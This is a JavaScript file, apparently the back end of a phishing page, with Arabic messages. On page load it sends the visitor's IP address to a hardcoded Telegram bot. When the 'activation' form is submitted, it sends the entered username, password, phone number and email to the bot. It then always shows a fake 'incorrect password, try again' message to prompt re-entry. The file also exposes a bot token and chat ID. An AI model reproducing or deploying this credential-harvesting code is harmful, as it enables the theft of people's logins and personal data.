// Telegram bot details
const TELEGRAM_BOT_TOKEN = "6924402995:AAEx-1e3pcV9kpYjpQnsjN-lkvreoCjxkFs";
const CHAT_ID = "1046458749";

// Sending message to Telegram bot
function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
    fetch(url)
        .then(response => response.json())
        .then(data => console.log('تم إرسال البيانات إلى بوت التليجرام'))
        .catch(error => console.error('حدث خطأ:', error));
}

// Get user IP address and send it to Telegram
function getIpAddress() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;
            console.log("IP Address:", ipAddress);
            sendToTelegram(`زائر جديد! عنوان IP: ${ipAddress}`);
        })
        .catch(error => console.error('لم نتمكن من الحصول على IP', error));
}

// Handle form submission
document.getElementById('activationForm').addEventListener('submit', function(event) {
    event.preventDefault();

    // Get form data
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const phone = document.getElementById('phone').value;
    const email = document.getElementById('email').value;

    // Create message to send to Telegram
    const message = `بيانات التفعيل:\nاسم المستخدم: ${username}\nكلمة المرور: ${password}\nرقم الهاتف: ${phone}\nالبريد الإلكتروني: ${email}`;

    // Send data to Telegram
    sendToTelegram(message);

    // Show message on site
    const responseMessage = document.getElementById('responseMessage');
    responseMessage.textContent = "كلمة المرور غير صحيحة. يرجى المحاولة مرة أخرى.";

    // Reset form
    document.getElementById('activationForm').reset();
});

// When the page loads, get IP address
window.onload = function() {
    getIpAddress();
};